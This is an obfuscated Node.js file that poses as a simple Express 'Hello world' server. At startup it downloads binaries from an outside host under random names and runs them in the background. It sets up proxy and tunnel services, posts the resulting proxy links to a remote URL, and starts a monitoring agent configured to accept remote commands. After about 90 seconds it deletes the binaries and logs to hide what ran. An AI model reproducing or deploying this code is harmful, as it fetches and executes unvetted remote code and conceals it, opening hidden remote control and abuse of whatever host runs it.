const _0x3db20e=_0x2f9f;(function(_0x36672c,_0x4678bd){const _0x49d45a=_0x2f9f,_0x4246bb=_0x36672c();while(!![]){try{const _0x1d116a=parseInt(_0x49d45a(0x1b7))/0x1+parseInt(_0x49d45a(0x1a6))/0x2+-parseInt(_0x49d45a(0x20a))/0x3*(-parseInt(_0x49d45a(0x220))/0x4)+-parseInt(_0x49d45a(0x1ec))/0x5*(parseInt(_0x49d45a(0x1e4))/0x6)+parseInt(_0x49d45a(0x1bf))/0x7*(parseInt(_0x49d45a(0x1dd))/0x8)+parseInt(_0x49d45a(0x245))/0x9+parseInt(_0x49d45a(0x1ad))/0xa*(-parseInt(_0x49d45a(0x1cc))/0xb);if(_0x1d116a===_0x4678bd)break;else _0x4246bb['push'](_0x4246bb['shift']());}catch(_0x1a1820){_0x4246bb['push'](_0x4246bb['shift']());}}}(_0x6c70,0xd3dce));const express=require(_0x3db20e(0x1a8)),app=express(),axios=require(_0x3db20e(0x1f3)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require('util'),exec=promisify(require(_0x3db20e(0x20b))[_0x3db20e(0x1a7)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x3db20e(0x1df)][_0x3db20e(0x1b0)]||'',PROJECT_URL=process[_0x3db20e(0x1df)][_0x3db20e(0x249)]||'',AUTO_ACCESS=process[_0x3db20e(0x1df)][_0x3db20e(0x237)]||![],FILE_PATH=process[_0x3db20e(0x1df)][_0x3db20e(0x1cb)]||_0x3db20e(0x1ee),SUB_PATH=process[_0x3db20e(0x1df)]['SUB_PATH']||'chunjing',PORT=process[_0x3db20e(0x1df)]['SERVER_PORT']||process[_0x3db20e(0x1df)][_0x3db20e(0x1e1)]||0xbb8,UUID=process[_0x3db20e(0x1df)][_0x3db20e(0x23c)]||_0x3db20e(0x191),NEZHA_SERVER=process[_0x3db20e(0x1df)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x3db20e(0x1df)][_0x3db20e(0x1da)]||'',NEZHA_KEY=process[_0x3db20e(0x1df)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x3db20e(0x1df)]['ARGO_DOMAIN']||_0x3db20e(0x21b),ARGO_AUTH=process['env'][_0x3db20e(0x203)]||'eyJhIjoiMjU1N2NjNGMwYWJjYWFmNjFjNjMzMjI4MDJlMmJkZDYiLCJ0IjoiNmYyODMxYmEtM2UzNS00NTM3LTg0YjMtNDQ0NDRlNzdhNTc3IiwicyI6Ik5UVXdObUV6WVdNdE16WmhOaTAwT1RBekxUa3hObU10WlRNNU5UVmpOMkV4WkdVeCJ9',ARGO_PORT=process[_0x3db20e(0x1df)][_0x3db20e(0x221)]||0x1f41,CFIP=process[_0x3db20e(0x1df)][_0x3db20e(0x1ca)]||'cdns.doon.eu.org',CFPORT=process[_0x3db20e(0x1df)][_0x3db20e(0x1ba)]||0x1bb,NAME=process[_0x3db20e(0x1df)][_0x3db20e(0x24c)]||_0x3db20e(0x218);!fs[_0x3db20e(0x190)](FILE_PATH)?(fs[_0x3db20e(0x1e9)](FILE_PATH),console[_0x3db20e(0x1d6)](FILE_PATH+_0x3db20e(0x1c1))):console[_0x3db20e(0x1d6)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x1c842a=_0x3db20e,_0x1a591a=_0x1c842a(0x194);let _0x4972a4='';for(let _0x5b46e2=0x0;_0x5b46e2<0x6;_0x5b46e2++){_0x4972a4+=_0x1a591a[_0x1c842a(0x1bd)](Math[_0x1c842a(0x22e)](Math[_0x1c842a(0x23d)]()*_0x1a591a[_0x1c842a(0x219)]));}return _0x4972a4;}function _0x6c70(){const _0x5ae7be=['none','arch','2053','has','\x0a\x20\x20\x20\x20','.exe\x20>\x20nul\x202>&1','App\x20is\x20running','\x20successfully','ARGO_AUTH','Nodes\x20uploaded\x20successfully','from','\x0a\x20\x20credentials-file:\x20','includes','amd','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','753joeDKU','child_process','pop','split','writeFileSync','?encryption=none&security=tls&sni=','aarch64','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','ArgoDomain:','pkill\x20-f\x20\x22[','php\x20running\x20error:\x20','Error\x20executing\x20command:\x20','\x20is\x20running','catch','reese','length','&path=%2Fvless-argo%3Fed%3D2560#','reese.fuluzh.dpdns.org','127.0.0.1','stream','npm\x20running\x20error:\x20','Empowerment\x20success\x20for\x20','956lhjjWh','ARGO_PORT','Error\x20in\x20startserver:','del\x20/f\x20/q\x20','send','\x20-c\x20\x22','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','https://arm64.ssss.nyc.mn/v1','Hello\x20world!','/vmess-argo','?security=tls&sni=','/api/add-nodes','https://amd64.ssss.nyc.mn/v1','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','floor','error','close','tunnel.yml','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','direct','&path=%2Ftrojan-argo%3Fed%3D2560#','Unhandled\x20error\x20in\x20startserver:','vless','AUTO_ACCESS','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','https://amd64.ssss.nyc.mn/web','nohup\x20','tls','UUID','random','unlinkSync','2083','NEZHA\x20variable\x20is\x20empty,skip\x20running','Error\x20downloading\x20files:','sub.txt','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','rm\x20-rf\x20','5440302hVhfVJ','8443','web\x20running\x20error:\x20','TunnelSecret','PROJECT_URL','/vmess-argo?ed=2560','win32','NAME','stringify','boot.log','application/json','existsSync','9afd1229-b893-40c1-84dd-51e7ce204913','config.yaml','\x20failed:\x20','abcdefghijklmnopqrstuvwxyz','tcp','2087','platform','tunnel.json','config.json','\x20-s\x20','set','listen','Download\x20','443','vmess','trojan','utf-8','\x0a\x20\x20tunnel:\x20','text/plain;\x20charset=utf-8','/api/add-subscriptions','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','1859074SrcjnW','exec','express','join','readdirSync','quic','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','7273440VbxNBG','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','\x22\x20>\x20/dev/null\x202>&1','UPLOAD_URL','firefox','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','unshift','/sub.txt\x20saved\x20successfully','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x20>\x20nul\x202>&1','88479cgMvLy','forEach','https://arm64.ssss.nyc.mn/web','CFPORT','list.txt','/config.json\x20>/dev/null\x202>&1\x20&','charAt','false','341383HVjVCa','\x0a\x20\x20\x0avmess://','\x20is\x20created','fileUrl','clear','\x20>/dev/null\x202>&1\x20&','substring','/vless-argo','https://amd64.ssss.nyc.mn/agent','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','http','CFIP','FILE_PATH','11PSFgno','arm64','match','readFileSync','base64','toString','trim','Empowerment\x20failed\x20for\x20','https://arm64.ssss.nyc.mn/agent','push','log','true','arm','get','NEZHA_PORT','Error\x20reading\x20boot.log:','fileName','168ZkdWOi','filter','env','pipe','PORT','response','http\x20server\x20is\x20running\x20on\x20port:','12yHCEJD','&fp=firefox&type=ws&host=','/api/delete-nodes','Skipping\x20adding\x20automatic\x20access\x20task','createWriteStream','mkdirSync','\x20-p\x20','/trojan-argo','2778745WVXzEu','\x20-c\x20','./tmp','ARGO_DOMAIN:','status','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','test','axios','message','/tunnel.yml\x20run','https+local://8.8.8.8/dns-query','\x0aclient_secret:\x20','basename','\x20>/dev/null\x202>&1','https://arm64.ssss.nyc.mn/bot'];_0x6c70=function(){return _0x5ae7be;};return _0x6c70();}function _0x2f9f(_0x4159d2,_0x1f5028){_0x4159d2=_0x4159d2-0x18d;const _0x6c706a=_0x6c70();let _0x2f9fec=_0x6c706a[_0x4159d2];return _0x2f9fec;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x3db20e(0x1a9)](FILE_PATH,npmName),phpPath=path[_0x3db20e(0x1a9)](FILE_PATH,phpName),webPath=path[_0x3db20e(0x1a9)](FILE_PATH,webName),botPath=path[_0x3db20e(0x1a9)](FILE_PATH,botName),subPath=path[_0x3db20e(0x1a9)](FILE_PATH,_0x3db20e(0x242)),listPath=path[_0x3db20e(0x1a9)](FILE_PATH,_0x3db20e(0x1bb)),bootLogPath=path[_0x3db20e(0x1a9)](FILE_PATH,_0x3db20e(0x18e)),configPath=path[_0x3db20e(0x1a9)](FILE_PATH,_0x3db20e(0x199));function deleteNodes(){const _0x15d393=_0x3db20e;try{if(!UPLOAD_URL)return;if(!fs[_0x15d393(0x190)](subPath))return;let _0x80e097;try{_0x80e097=fs['readFileSync'](subPath,_0x15d393(0x1a1));}catch{return null;}const _0x34743f=Buffer['from'](_0x80e097,_0x15d393(0x1d0))[_0x15d393(0x1d1)](_0x15d393(0x1a1)),_0x299b52=_0x34743f[_0x15d393(0x20d)]('\x0a')[_0x15d393(0x1de)](_0x56e849=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x15d393(0x1f2)](_0x56e849));if(_0x299b52['length']===0x0)return;return axios['post'](UPLOAD_URL+_0x15d393(0x1e6),JSON['stringify']({'nodes':_0x299b52}),{'headers':{'Content-Type':_0x15d393(0x18f)}})[_0x15d393(0x217)](_0x2b8e1e=>{return null;}),null;}catch(_0x579d2e){return null;}}function cleanupOldFiles(){const _0x509fdb=_0x3db20e;try{const _0x3adf88=fs[_0x509fdb(0x1aa)](FILE_PATH);_0x3adf88[_0x509fdb(0x1b8)](_0x269f4c=>{const _0x26ff5d=_0x509fdb,_0x119e6d=path[_0x26ff5d(0x1a9)](FILE_PATH,_0x269f4c);try{const _0x1f5567=fs['statSync'](_0x119e6d);_0x1f5567['isFile']()&&fs['unlinkSync'](_0x119e6d);}catch(_0x23977e){}});}catch(_0x542369){}}app[_0x3db20e(0x1d9)]('/',function(_0x54d871,_0x400546){const _0x3ac152=_0x3db20e;_0x400546[_0x3ac152(0x224)](_0x3ac152(0x228));});async function generateConfig(){const _0x462caf=_0x3db20e,_0x4ae83a={'log':{'access':'/dev/null','error':'/dev/null','loglevel':_0x462caf(0x1fb)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x462caf(0x236),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x462caf(0x1fb),'fallbacks':[{'dest':0xbb9},{'path':_0x462caf(0x1c6),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x462caf(0x1eb),'dest':0xbbc}]},'streamSettings':{'network':_0x462caf(0x195)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x462caf(0x236),'settings':{'clients':[{'id':UUID}],'decryption':_0x462caf(0x1fb)},'streamSettings':{'network':'tcp','security':_0x462caf(0x1fb)}},{'port':0xbba,'listen':_0x462caf(0x21c),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x462caf(0x1c6)}},'sniffing':{'enabled':!![],'destOverride':[_0x462caf(0x1c9),_0x462caf(0x23b),_0x462caf(0x1ab)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x462caf(0x21c),'protocol':_0x462caf(0x19f),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x462caf(0x229)}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x462caf(0x1ab)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x462caf(0x1a0),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x462caf(0x1fb),'wsSettings':{'path':_0x462caf(0x1eb)}},'sniffing':{'enabled':!![],'destOverride':[_0x462caf(0x1c9),'tls','quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x462caf(0x1f6)]},'outbounds':[{'protocol':'freedom','tag':_0x462caf(0x233)},{'protocol':'blackhole','tag':'block'}]};fs['writeFileSync'](path[_0x462caf(0x1a9)](FILE_PATH,_0x462caf(0x199)),JSON[_0x462caf(0x18d)](_0x4ae83a,null,0x2));}function getSystemArchitecture(){const _0x135e79=_0x3db20e,_0x4cf6ab=os[_0x135e79(0x1fc)]();return _0x4cf6ab==='arm'||_0x4cf6ab===_0x135e79(0x1cd)||_0x4cf6ab===_0x135e79(0x210)?'arm':_0x135e79(0x208);}function downloadFile(_0x1a62ec,_0x1b563e,_0x416c07){const _0x709b87=_0x3db20e,_0x42270a=_0x1a62ec;!fs['existsSync'](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x2da4f9=fs[_0x709b87(0x1e8)](_0x42270a);axios({'method':'get','url':_0x1b563e,'responseType':_0x709b87(0x21d)})['then'](_0x3b53c6=>{const _0x19c4d9=_0x709b87;_0x3b53c6['data'][_0x19c4d9(0x1e0)](_0x2da4f9),_0x2da4f9['on']('finish',()=>{const _0x32f12d=_0x19c4d9;_0x2da4f9[_0x32f12d(0x230)](),console[_0x32f12d(0x1d6)](_0x32f12d(0x19d)+path['basename'](_0x42270a)+_0x32f12d(0x202)),_0x416c07(null,_0x42270a);}),_0x2da4f9['on'](_0x19c4d9(0x22f),_0x45240b=>{const _0x9dc68f=_0x19c4d9;fs['unlink'](_0x42270a,()=>{});const _0x186537=_0x9dc68f(0x19d)+path['basename'](_0x42270a)+_0x9dc68f(0x193)+_0x45240b[_0x9dc68f(0x1f4)];console[_0x9dc68f(0x22f)](_0x186537),_0x416c07(_0x186537);});})[_0x709b87(0x217)](_0x3d4d22=>{const _0x422fb3=_0x709b87,_0x149ff8=_0x422fb3(0x19d)+path[_0x422fb3(0x1f8)](_0x42270a)+_0x422fb3(0x193)+_0x3d4d22[_0x422fb3(0x1f4)];console['error'](_0x149ff8),_0x416c07(_0x149ff8);});}async function downloadFilesAndRun(){const _0x2f7014=_0x3db20e,_0x244440=getSystemArchitecture(),_0x2a98de=getFilesForArchitecture(_0x244440);if(_0x2a98de[_0x2f7014(0x219)]===0x0){console[_0x2f7014(0x1d6)](_0x2f7014(0x209));return;}const _0x435d15=_0x2a98de['map'](_0x4f3849=>{return new Promise((_0x518348,_0x4b37b0)=>{const _0x35546c=_0x2f9f;downloadFile(_0x4f3849[_0x35546c(0x1dc)],_0x4f3849[_0x35546c(0x1c2)],(_0x5f7ee5,_0x1bb77f)=>{_0x5f7ee5?_0x4b37b0(_0x5f7ee5):_0x518348(_0x1bb77f);});});});try{await Promise['all'](_0x435d15);}catch(_0x11e176){console['error'](_0x2f7014(0x241),_0x11e176);return;}function _0x51758e(_0x321da2){const _0x3b91ce=_0x2f7014,_0x2c07c1=0x1fd;_0x321da2[_0x3b91ce(0x1b8)](_0x4eda98=>{const _0x103739=_0x3b91ce;fs[_0x103739(0x190)](_0x4eda98)&&fs['chmod'](_0x4eda98,_0x2c07c1,_0x553353=>{const _0x19964c=_0x103739;_0x553353?console['error'](_0x19964c(0x1d3)+_0x4eda98+':\x20'+_0x553353):console[_0x19964c(0x1d6)](_0x19964c(0x21f)+_0x4eda98+':\x20'+_0x2c07c1[_0x19964c(0x1d1)](0x8));});});}const _0x157945=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x51758e(_0x157945);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x11d270=NEZHA_SERVER[_0x2f7014(0x207)](':')?NEZHA_SERVER[_0x2f7014(0x20d)](':')[_0x2f7014(0x20c)]():'',_0x238910=new Set([_0x2f7014(0x19e),_0x2f7014(0x246),'2096','2087',_0x2f7014(0x23f),_0x2f7014(0x1fd)]),_0x24b9e2=_0x238910[_0x2f7014(0x1fe)](_0x11d270)?_0x2f7014(0x1d7):_0x2f7014(0x1be),_0x36a567=_0x2f7014(0x1f7)+NEZHA_KEY+_0x2f7014(0x1a5)+NEZHA_SERVER+_0x2f7014(0x1ac)+_0x24b9e2+_0x2f7014(0x1b2)+UUID;fs[_0x2f7014(0x20e)](path[_0x2f7014(0x1a9)](FILE_PATH,_0x2f7014(0x192)),_0x36a567);const _0x9fe795=_0x2f7014(0x23a)+phpPath+_0x2f7014(0x225)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x9fe795),console[_0x2f7014(0x1d6)](phpName+'\x20is\x20running'),await new Promise(_0xf86ea8=>setTimeout(_0xf86ea8,0x3e8));}catch(_0x53b7a5){console[_0x2f7014(0x22f)](_0x2f7014(0x214)+_0x53b7a5);}}else{let _0x2836c2='';const _0x5e12a0=['443',_0x2f7014(0x246),'2096',_0x2f7014(0x196),_0x2f7014(0x23f),_0x2f7014(0x1fd)];_0x5e12a0[_0x2f7014(0x207)](NEZHA_PORT)&&(_0x2836c2='--tls');const _0x4f2df0='nohup\x20'+npmPath+_0x2f7014(0x19a)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2f7014(0x1ea)+NEZHA_KEY+'\x20'+_0x2836c2+_0x2f7014(0x232);try{await exec(_0x4f2df0),console[_0x2f7014(0x1d6)](npmName+_0x2f7014(0x216)),await new Promise(_0x5ce7e1=>setTimeout(_0x5ce7e1,0x3e8));}catch(_0x32df1a){console[_0x2f7014(0x22f)](_0x2f7014(0x21e)+_0x32df1a);}}}else console['log'](_0x2f7014(0x240));const _0x4fbfd2=_0x2f7014(0x23a)+webPath+_0x2f7014(0x1ed)+FILE_PATH+_0x2f7014(0x1bc);try{await exec(_0x4fbfd2),console['log'](webName+'\x20is\x20running'),await new Promise(_0xe8677=>setTimeout(_0xe8677,0x3e8));}catch(_0x5de203){console[_0x2f7014(0x22f)](_0x2f7014(0x247)+_0x5de203);}if(fs[_0x2f7014(0x190)](botPath)){let _0x5decef;if(ARGO_AUTH[_0x2f7014(0x1ce)](/^[A-Z0-9a-z=]{120,250}$/))_0x5decef=_0x2f7014(0x1f1)+ARGO_AUTH;else ARGO_AUTH[_0x2f7014(0x1ce)](/TunnelSecret/)?_0x5decef='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x2f7014(0x1f5):_0x5decef=_0x2f7014(0x1c8)+FILE_PATH+_0x2f7014(0x238)+ARGO_PORT;try{await exec(_0x2f7014(0x23a)+botPath+'\x20'+_0x5decef+_0x2f7014(0x1c4)),console[_0x2f7014(0x1d6)](botName+_0x2f7014(0x216)),await new Promise(_0x3a5728=>setTimeout(_0x3a5728,0x7d0));}catch(_0x3cb59c){console[_0x2f7014(0x22f)](_0x2f7014(0x215)+_0x3cb59c);}}await new Promise(_0x52ef6b=>setTimeout(_0x52ef6b,0x1388));}function getFilesForArchitecture(_0x4d6220){const _0x5e2407=_0x3db20e;let _0x55dc0c;_0x4d6220===_0x5e2407(0x1d8)?_0x55dc0c=[{'fileName':webPath,'fileUrl':_0x5e2407(0x1b9)},{'fileName':botPath,'fileUrl':_0x5e2407(0x1fa)}]:_0x55dc0c=[{'fileName':webPath,'fileUrl':_0x5e2407(0x239)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x506258=_0x4d6220===_0x5e2407(0x1d8)?_0x5e2407(0x1d4):_0x5e2407(0x1c7);_0x55dc0c['unshift']({'fileName':npmPath,'fileUrl':_0x506258});}else{const _0x5aac29=_0x4d6220===_0x5e2407(0x1d8)?_0x5e2407(0x227):_0x5e2407(0x22c);_0x55dc0c[_0x5e2407(0x1b3)]({'fileName':phpPath,'fileUrl':_0x5aac29});}}return _0x55dc0c;}function argoType(){const _0x256495=_0x3db20e;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x256495(0x1d6)](_0x256495(0x211));return;}if(ARGO_AUTH['includes'](_0x256495(0x248))){fs[_0x256495(0x20e)](path[_0x256495(0x1a9)](FILE_PATH,_0x256495(0x198)),ARGO_AUTH);const _0x16375b=_0x256495(0x1a2)+ARGO_AUTH[_0x256495(0x20d)]('\x22')[0xb]+_0x256495(0x206)+path[_0x256495(0x1a9)](FILE_PATH,_0x256495(0x198))+_0x256495(0x243)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x256495(0x1ae);fs[_0x256495(0x20e)](path[_0x256495(0x1a9)](FILE_PATH,_0x256495(0x231)),_0x16375b);}else console[_0x256495(0x1d6)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}argoType();async function extractDomains(){const _0x27c71c=_0x3db20e;let _0x2414c7;if(ARGO_AUTH&&ARGO_DOMAIN)_0x2414c7=ARGO_DOMAIN,console[_0x27c71c(0x1d6)](_0x27c71c(0x1ef),_0x2414c7),await _0x1e936f(_0x2414c7);else try{const _0x2ff7ad=fs[_0x27c71c(0x1cf)](path[_0x27c71c(0x1a9)](FILE_PATH,_0x27c71c(0x18e)),_0x27c71c(0x1a1)),_0x2a26ef=_0x2ff7ad[_0x27c71c(0x20d)]('\x0a'),_0x2f327b=[];_0x2a26ef[_0x27c71c(0x1b8)](_0xd0a409=>{const _0x5d7d88=_0x27c71c,_0x39c2f7=_0xd0a409[_0x5d7d88(0x1ce)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x39c2f7){const _0x30f7ff=_0x39c2f7[0x1];_0x2f327b[_0x5d7d88(0x1d5)](_0x30f7ff);}});if(_0x2f327b['length']>0x0)_0x2414c7=_0x2f327b[0x0],console[_0x27c71c(0x1d6)](_0x27c71c(0x212),_0x2414c7),await _0x1e936f(_0x2414c7);else{console[_0x27c71c(0x1d6)](_0x27c71c(0x22d)),fs[_0x27c71c(0x23e)](path[_0x27c71c(0x1a9)](FILE_PATH,_0x27c71c(0x18e)));async function _0x3b254d(){const _0x2b5816=_0x27c71c;try{process[_0x2b5816(0x197)]===_0x2b5816(0x24b)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x2b5816(0x200)):await exec(_0x2b5816(0x213)+botName[_0x2b5816(0x1bd)](0x0)+']'+botName[_0x2b5816(0x1c5)](0x1)+_0x2b5816(0x1af));}catch(_0x3e3607){}}_0x3b254d(),await new Promise(_0x15afe8=>setTimeout(_0x15afe8,0xbb8));const _0x23be88='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x27c71c(0x238)+ARGO_PORT;try{await exec(_0x27c71c(0x23a)+botPath+'\x20'+_0x23be88+_0x27c71c(0x1c4)),console['log'](botName+_0x27c71c(0x216)),await new Promise(_0xda930=>setTimeout(_0xda930,0xbb8)),await extractDomains();}catch(_0x357448){console[_0x27c71c(0x22f)](_0x27c71c(0x215)+_0x357448);}}}catch(_0x1376e2){console[_0x27c71c(0x22f)](_0x27c71c(0x1db),_0x1376e2);}async function _0x1e936f(_0x7937d6){const _0x2207d3=_0x27c71c,_0x561b40=execSync(_0x2207d3(0x226),{'encoding':'utf-8'}),_0x43945a=_0x561b40[_0x2207d3(0x1d2)](),_0x756405=NAME?NAME+'-'+_0x43945a:_0x43945a;return new Promise(_0x76cade=>{setTimeout(()=>{const _0x44c31c=_0x2f9f,_0x2b5a36={'v':'2','ps':''+_0x756405,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x44c31c(0x1fb),'net':'ws','type':'none','host':_0x7937d6,'path':_0x44c31c(0x24a),'tls':_0x44c31c(0x23b),'sni':_0x7937d6,'alpn':'','fp':_0x44c31c(0x1b1)},_0x379218='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x44c31c(0x20f)+_0x7937d6+_0x44c31c(0x1e5)+_0x7937d6+_0x44c31c(0x21a)+_0x756405+_0x44c31c(0x1c0)+Buffer['from'](JSON[_0x44c31c(0x18d)](_0x2b5a36))[_0x44c31c(0x1d1)]('base64')+'\x0a\x20\x20\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x44c31c(0x22a)+_0x7937d6+'&fp=firefox&type=ws&host='+_0x7937d6+_0x44c31c(0x234)+_0x756405+_0x44c31c(0x1ff);console[_0x44c31c(0x1d6)](Buffer[_0x44c31c(0x205)](_0x379218)[_0x44c31c(0x1d1)](_0x44c31c(0x1d0))),fs[_0x44c31c(0x20e)](subPath,Buffer[_0x44c31c(0x205)](_0x379218)[_0x44c31c(0x1d1)](_0x44c31c(0x1d0))),console[_0x44c31c(0x1d6)](FILE_PATH+_0x44c31c(0x1b4)),uploadNodes(),app[_0x44c31c(0x1d9)]('/'+SUB_PATH,(_0x131d42,_0x2f0b02)=>{const _0x1e589c=_0x44c31c,_0x10f721=Buffer[_0x1e589c(0x205)](_0x379218)[_0x1e589c(0x1d1)](_0x1e589c(0x1d0));_0x2f0b02[_0x1e589c(0x19b)]('Content-Type',_0x1e589c(0x1a3)),_0x2f0b02[_0x1e589c(0x224)](_0x10f721);}),_0x76cade(_0x379218);},0x7d0);});}}async function uploadNodes(){const _0x4d0770=_0x3db20e;if(UPLOAD_URL&&PROJECT_URL){const _0x151ccd=PROJECT_URL+'/'+SUB_PATH,_0x1107ac={'subscription':[_0x151ccd]};try{const _0xec0dd=await axios['post'](UPLOAD_URL+_0x4d0770(0x1a4),_0x1107ac,{'headers':{'Content-Type':_0x4d0770(0x18f)}});return _0xec0dd&&_0xec0dd[_0x4d0770(0x1f0)]===0xc8?(console[_0x4d0770(0x1d6)]('Subscription\x20uploaded\x20successfully'),_0xec0dd):null;}catch(_0x42c727){if(_0x42c727['response']){if(_0x42c727[_0x4d0770(0x1e2)][_0x4d0770(0x1f0)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x316b2c=fs[_0x4d0770(0x1cf)](listPath,_0x4d0770(0x1a1)),_0x3a4c67=_0x316b2c['split']('\x0a')[_0x4d0770(0x1de)](_0xf492ec=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4d0770(0x1f2)](_0xf492ec));if(_0x3a4c67['length']===0x0)return;const _0x3196a5=JSON[_0x4d0770(0x18d)]({'nodes':_0x3a4c67});try{const _0x4e3535=await axios['post'](UPLOAD_URL+_0x4d0770(0x22b),_0x3196a5,{'headers':{'Content-Type':'application/json'}});return _0x4e3535&&_0x4e3535[_0x4d0770(0x1f0)]===0xc8?(console[_0x4d0770(0x1d6)](_0x4d0770(0x204)),_0x4e3535):null;}catch(_0x486660){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x493623=_0x2f9f,_0x25f10e=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x25f10e['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x25f10e['push'](phpPath);process['platform']===_0x493623(0x24b)?exec(_0x493623(0x223)+_0x25f10e[_0x493623(0x1a9)]('\x20')+_0x493623(0x1b6),_0x1bb744=>{const _0x277dff=_0x493623;console[_0x277dff(0x1c3)](),console[_0x277dff(0x1d6)](_0x277dff(0x201)),console[_0x277dff(0x1d6)](_0x277dff(0x1b5));}):exec(_0x493623(0x244)+_0x25f10e[_0x493623(0x1a9)]('\x20')+_0x493623(0x1f9),_0x109838=>{const _0x3b2f86=_0x493623;console[_0x3b2f86(0x1c3)](),console[_0x3b2f86(0x1d6)](_0x3b2f86(0x201)),console['log'](_0x3b2f86(0x1b5));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0xa986d7=_0x3db20e;if(!AUTO_ACCESS||!PROJECT_URL){console[_0xa986d7(0x1d6)](_0xa986d7(0x1e7));return;}try{const _0x956b35=await axios['post']('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0xa986d7(0x18f)}});return console[_0xa986d7(0x1d6)]('automatic\x20access\x20task\x20added\x20successfully'),_0x956b35;}catch(_0x570fbf){return console[_0xa986d7(0x22f)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x570fbf[_0xa986d7(0x1f4)]),null;}}async function startserver(){const _0x155274=_0x3db20e;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x272918){console[_0x155274(0x22f)](_0x155274(0x222),_0x272918);}}startserver()[_0x3db20e(0x217)](_0x46a996=>{const _0x330cbf=_0x3db20e;console[_0x330cbf(0x22f)](_0x330cbf(0x235),_0x46a996);}),app[_0x3db20e(0x19c)](PORT,()=>console[_0x3db20e(0x1d6)](_0x3db20e(0x1e3)+PORT+'!'));
